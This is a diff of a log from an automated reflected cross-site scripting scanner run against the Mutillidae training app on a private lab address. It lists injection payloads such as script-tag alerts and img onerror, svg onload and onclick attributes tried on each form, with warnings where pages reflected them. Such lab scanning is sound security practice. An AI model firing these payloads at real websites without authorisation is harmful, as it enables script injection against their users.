@@ -1,6 +1,169 @@
 INFO - 
 Starting ReflectedXSSScanner scan
-INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129/mutillidae/index.php?page=view-someones-blog.php
-WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=view-someones-blog.php with payload: <scrIpt>alert('XSS')</sCriPt>
-INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129/mutillidae/index.php?page=add-to-your-blog.php
-WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=add-to-your-blog.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=login.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/set-up-database.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=show-log.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=captured-data.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=credits.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=user-info.php: Alert Text: None
+Message: Dismissed user prompt dialog: XSS
+Stacktrace:
+RemoteError@chrome://remote/content/shared/RemoteError.sys.mjs:8:8
+WebDriverError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:187:5
+UnexpectedAlertOpenError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:704:5
+GeckoDriver.prototype._handleUserPrompts@chrome://remote/content/marionette/driver.sys.mjs:2841:13
+
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=user-info.php: Message: TypeError: document.body is null
+Stacktrace:
+@http://192.168.232.129/mutillidae/index.php?page=user-info.php:7:25
+@http://192.168.232.129/mutillidae/index.php?page=user-info.php:10:8
+
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=user-info.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=register.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php: Alert Text: None
+Message: Dismissed user prompt dialog: XSS
+Stacktrace:
+RemoteError@chrome://remote/content/shared/RemoteError.sys.mjs:8:8
+WebDriverError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:187:5
+UnexpectedAlertOpenError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:704:5
+GeckoDriver.prototype._handleUserPrompts@chrome://remote/content/marionette/driver.sys.mjs:2841:13
+
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=site-footer-xss-discussion.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=capture-data.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=show-log.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/?page=user-info.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=user-info.php
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=browser-info.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=login.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=login.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php: Alert Text: None
+Message: Dismissed user prompt dialog: XSS
+Stacktrace:
+RemoteError@chrome://remote/content/shared/RemoteError.sys.mjs:8:8
+WebDriverError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:187:5
+UnexpectedAlertOpenError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:704:5
+GeckoDriver.prototype._handleUserPrompts@chrome://remote/content/marionette/driver.sys.mjs:2841:13
+
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=source-viewer.php
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=add-to-your-blog.php with payload: <scrIpt>alert('XSS')</sCriPt>
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=secret-administrative-pages.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=credits.php. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: <img src=x onerror=prompt()> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: <scrIpt>alert("XSS")</sCriPt> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+ERROR - 	An error occurred while sending form with XSS payload to http://192.168.232.129:80/mutillidae/?page=source-viewer.php: Message: SyntaxError: unexpected token: identifier
+
+INFO - 	Testing payload: <img src=x onerror=console.log(1);> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: <svg onload=alert(1)> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: <b onMouseOver=alert(1);>test</b> on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: accesskey='x' onclick='alert(1)' b on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	Testing payload: button onclick='alert(1)'/ on http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - No Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=source-viewer.php
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=framing.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/framer.html. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=change-log.htm. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=installation.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/vulnerabilities.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=usage-instructions.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=php-errors.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=notes.php. Skipping...
+INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.irongeek.com/. Skipping...
+INFO - 	Testing payload: <scrIpt>alert('XSS')</sCriPt> on http://192.168.232.129:80/mutillidae/?page=register.php
+WARNING - Reflected Cross Site Scripting vulnerability found at: http://192.168.232.129:80/mutillidae/?page=register.php with payload: <scrIpt>alert('XSS')</sCriPt>
